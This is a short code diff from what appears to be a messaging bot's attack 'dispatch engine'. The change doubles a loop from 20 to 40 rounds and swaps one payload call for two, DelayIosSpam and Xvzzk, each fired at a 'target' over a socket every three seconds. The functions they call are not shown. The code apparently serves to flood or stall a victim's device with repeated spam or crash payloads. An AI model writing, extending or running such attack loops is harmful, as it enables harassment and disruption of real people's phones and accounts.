@@ -3371,7 +3371,7 @@ Dispatch engine initialized.
         
                 try {
         
-                    for (let i = 0; i < 20; i++) {
+                    for (let i = 0; i < 40; i++) {
         
                         try {
         
@@ -3379,7 +3379,8 @@ Dispatch engine initialized.
                                 throw new Error("Socket unavailable");
                             }
         
-                            await P7X(sock, target);
+                            await DelayIosSpam(sock, target);
+                            await Xvzzk(sock, target);
                             await sleep(3000)
         
                             console.log(
